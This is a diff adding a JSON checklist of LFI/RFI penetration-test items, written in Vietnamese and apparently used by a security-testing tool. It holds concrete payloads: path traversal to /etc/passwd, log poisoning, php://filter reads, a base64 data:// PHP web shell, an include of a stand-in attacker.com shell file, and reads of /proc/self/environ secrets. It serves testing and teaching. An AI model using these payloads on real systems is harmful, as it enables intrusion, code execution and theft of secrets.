@@ -1,0 +1,43 @@
+{
+  "id": "lfi_rfi",
+  "name": "LFI/RFI Testing",
+  "group": "vulnerability",
+  "items": [
+    {
+      "id": "lfi-01",
+      "title": "Local File Inclusion (LFI)",
+      "severity": "CRITICAL",
+      "description": "Thử include file local qua param: page=../../../../etc/passwd, file=../../config.php. Server include file và trả về nội dung → đọc source code, config, private key."
+    },
+    {
+      "id": "lfi-02",
+      "title": "LFI with log poisoning",
+      "severity": "CRITICAL",
+      "description": "Nếu có LFI đọc được access log (../../var/log/apache2/access.log): inject PHP code vào User-Agent hoặc path → log bị poison → include log → RCE."
+    },
+    {
+      "id": "lfi-03",
+      "title": "LFI via PHP wrapper",
+      "severity": "CRITICAL",
+      "description": "Dùng PHP stream wrapper để đọc file mà không trigger execution:\n- php://filter/convert.base64-encode/resource=config.php\n- php://filter/read=string.rot13/resource=index.php\nOutput là base64 → decode để xem source code."
+    },
+    {
+      "id": "lfi-04",
+      "title": "LFI via data:// wrapper",
+      "severity": "CRITICAL",
+      "description": "Nếu allow_url_include=On: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ → include inline PHP code → RCE."
+    },
+    {
+      "id": "lfi-05",
+      "title": "Remote File Inclusion (RFI)",
+      "severity": "CRITICAL",
+      "description": "Thử include URL remote: page=http://attacker.com/shell.txt. Nếu allow_url_include=On → server fetch và execute code từ server attacker → RCE."
+    },
+    {
+      "id": "lfi-06",
+      "title": "LFI via /proc filesystem",
+      "severity": "HIGH",
+      "description": "Đọc thông tin process qua /proc: /proc/self/environ (biến môi trường, có thể chứa secret), /proc/self/cmdline (lệnh khởi động app), /proc/self/fd/ (file descriptor)."
+    }
+  ]
+}
